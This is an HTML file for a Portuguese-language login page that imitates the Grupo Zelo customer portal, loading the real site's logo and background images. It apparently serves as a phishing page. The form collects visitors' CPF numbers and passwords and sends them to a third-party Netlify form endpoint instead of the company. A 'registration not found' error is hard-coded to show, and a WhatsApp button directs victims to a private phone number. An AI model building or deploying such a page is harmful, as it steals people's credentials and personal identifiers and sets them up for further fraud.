<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Grupo Zelo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-image: url('https://areadocliente.grupozelo.com/images/login_background.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            position: relative;
        }
        
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.3);
            z-index: 0;
        }
        
        .login-container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 444px;
            padding: 40px 30px;
            position: relative;
            z-index: 1;
        }
        
        .logo {
            margin-bottom: 30px;
            text-align: center;
        }
        
        .logo img {
            max-width: 200px;
            height: auto;
            display: block;
            margin: 0 auto 15px auto;
        }
        
        .welcome-text {
            color: #8f8c8d;
            font-size: 14px;
            text-align: left;
            margin-left: 10px;
        }
        
        .welcome-text h2 {
            color: #2c3e50;
            font-size: 18px;
            margin-bottom: 5px;
            font-weight: 600;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #2c3e50;
            font-weight: 500;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input:focus {
            border-color: #3498db;
            outline: none;
        }
        
        hr {
            border: none;
            height: 1px;
            background-color: #eee;
            margin: 25px 0;
        }
        
        .btn-login {
            background-color: #171695;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px;
            width: 100%;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        .btn-login:hover {
            background-color: #2980b9;
        }
        
        .links {
            text-align: center;
            margin-top: 20px;
            display: flex;
            justify-content: space-between;
        }
        
        .links a {
            display: block;
            color: #171695;
            text-decoration: none;
            margin-bottom: 10px;
            font-weight: 500;
        }
        
        .links a:hover {
            text-decoration: underline;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #7f8c8d;
            font-size: 12px;
        }
        
        .error-message {
            background-color: #f8d7da;
            color: #721c24;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #f5c6cb;
        }
        
        .whatsapp-button {
            background-color: #25D366;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px;
            width: 100%;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background-color 0.3s;
            text-decoration: none;
        }
        
        .whatsapp-button:hover {
            background-color: #128C7E;
        }
        
        .whatsapp-icon {
            width: 20px;
            height: 20px;
        }
        
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://areadocliente.grupozelo.com/_next/image?url=%2Fimages%2Flogo-desktop.png&w=384&q=75" alt="Grupo Zelo">
            <div class="welcome-text">
                <h2>Log In</h2>
                <p>Faça o login para acessar sua conta</p>
            </div>
        </div>
        
        <div class="error-message">
            Cadastro não encontrado! Entre em contato com o atendimento.
        </div>
        
        <!-- FORMULÁRIO NETLIFY -->
        <form name="login" method="POST" netlify data-netlify="true">
            <input type="hidden" name="form-name" value="login">
            
            <div class="form-group">
                <label for="cpf">CPF</label>
                <input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF" required>
            </div>
            
            <div class="form-group">
                <label for="senha">Senha</label>
                <input type="password" id="senha" name="senha" placeholder="Digite sua senha" required>
            </div>
            
            <hr>
            
            <button type="submit" class="btn-login">ENTRAR</button>
            
            <a href="https://wa.me/5531991748889?text=Olá, preciso de ajuda!" class="whatsapp-button" target="_blank">
                <svg class="whatsapp-icon" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893-.001-3.189-1.248-6.189-3.515-8.452"/>
                </svg>
                Falar com Atendimento
            </a>
            
            <div class="links">
                <a href="#">Crie uma conta</a>
                <a href="#">Esqueceu sua senha?</a>
            </div>
        </form>
        
        <div class="footer">
            &copy; 2025 Grupo Zelo - Todos os direitos reservados
        </div>
    </div>
</body>
</html>
